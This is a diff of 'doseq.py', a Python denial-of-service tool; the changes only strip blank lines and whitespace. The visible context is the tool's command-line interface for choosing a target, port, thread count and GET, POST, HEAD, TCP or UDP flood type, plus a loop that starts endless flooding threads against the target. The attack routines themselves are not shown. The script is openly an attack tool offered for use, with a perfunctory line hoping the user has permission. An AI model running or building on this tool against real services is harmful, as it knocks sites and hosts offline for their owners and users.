@@ -10,17 +10,13 @@ from urllib.parse import urlparse
 from core.uragents import *
 import http.client as http
 libgcc_s = ctypes.CDLL('libgcc_s.so.1')
-
 # COLORS ####################
 wi = "\033[1;37m"  # >>White#
 rd = "\033[1;31m"  # >Red   #
 gr = "\033[1;32m"  # >Green #
 yl = "\033[1;33m"  # >Yellow#
 #############################
-
 version_path = os.path.join('core', 'version.txt')
-
-
 attacks = ["get", "post", "head", "tcp", "udp"]
 os.system("cls || clear")
 
@@ -219,7 +215,6 @@ def quit(sig, fream):
         while True:
             if len(THREADS) == fin_threads:
                 break
-
     print(wi + "[" + gr + "*" + wi + "] Thanks For Using Doseq Script :)")
     if started:
         print("[" + gr + "*" + wi + "] I Hope You Used It With Permission" + yl + "!?" + wi)
@@ -258,7 +253,7 @@ banner = """\033[1;31m
                    .-"      "-.
                   /            \\
                  | \033[1;33m ${JOKER11}\033[1;31m  |
-                 |,  .-.  .-.  ,| 
+                 |,  .-.  .-.  ,|
                  | )(__/  \__)( |
                  |/     /\     \|
        (@_       (_     ^^     _)
@@ -270,12 +265,10 @@ banner = """\033[1;31m
             [---]   by:>\033[1;32m Oseid Aldary\033[1;37m   [---]\033[1;32m
             =-------=-=-=-=-=-=-=-=-=-------=
 """
-
 started = False
 signal.signal(signal.SIGINT, quit)
 signal.signal(signal.SIGTERM, quit)
 print(banner)
-
 parse = optparse.OptionParser(usage='''
 Usage: python3 ./doseq.py [OPTIONS...]
 -------------
@@ -308,7 +301,6 @@ Examples:
      | python3 doseq.py --update
 
 ''', add_help_option=False, version='Doseq version 1.0')
-
 parse.add_option('-s', '--server', '--target', type=str, dest='target')
 parse.add_option('-p', '--port', type=str, dest='port')
 parse.add_option('-t', '--threads', type=str, dest='threads')
@@ -316,9 +308,7 @@ parse.add_option('-a', '--attack', type=str, dest='attack')
 parse.add_option('-d', '--delay', type=str, dest='delay')
 parse.add_option('-S', '--sleep', type=str, dest='sleep')
 parse.add_option('-u', '--update', action='store_true', dest='update', default=False)
-
 (options, args) = parse.parse_args()
-
 target = options.target
 port = options.port
 threads = options.threads
@@ -327,7 +317,6 @@ delay = options.delay
 sleep = options.sleep
 update = options.update
 opts = [target, port, threads, attack, delay, sleep, update]
-
 if target:
     if not port:
         port = 80
@@ -371,7 +360,6 @@ else:
         sys.exit(1)
     print(parse.usage)
     sys.exit(0)
-
 if target.startswith(("https://", "http://")):
     if target.count("/") == 2:
         target = target + "/"
@@ -379,7 +367,6 @@ if target.startswith(("https://", "http://")):
 else:
     url = "http://" + target + "/"
 target = urlparse(url).netloc
-
 print(wi + "[" + yl + "~" + wi + f"] Check The Connection To The Target " + gr + f"{target}" + wi + ":" + rd + f"{port}" + wi + " [...]", end='\r')
 time.sleep(2)
 if not cnet(target, port):
@@ -402,13 +389,9 @@ print("\n" + banner)
 print(wi + "[" + gr + "*" + wi + "]" + yl + "-=-=-=-=-=-=-= " + gr + "Attack Has Been Start On (" + yl + f"{target}:{port}" + gr + ")" + yl + " -=-=-=-=-=-=-=" + wi + "[" + gr + "*" + wi + "]")
 print("[" + yl + "I" + wi + "] Infinity [ " + yl + attack.upper() + wi + " ] requests started On Target...")
 print("[" + yl + "I" + wi + "] Press " + gr + "' Ctrl+C ' " + wi + "To Stop The Attack")
-
-
 workers = round(threads / 2) if attack not in ('tcp', 'udp') else threads
 started = True
-
 for _ in range(workers):
-
     if attack == 'get':
         t1 = threading.Thread(target=get_attack)
         t1.daemon = True
@@ -445,11 +428,8 @@ for _ in range(workers):
         break
     if sleep:
         time.sleep(sleep)
-
 for t in THREADS:
     t.join()
-
-    
 ##############################################################
 #####################                #########################
 #####################   END OF TOOL  #########################
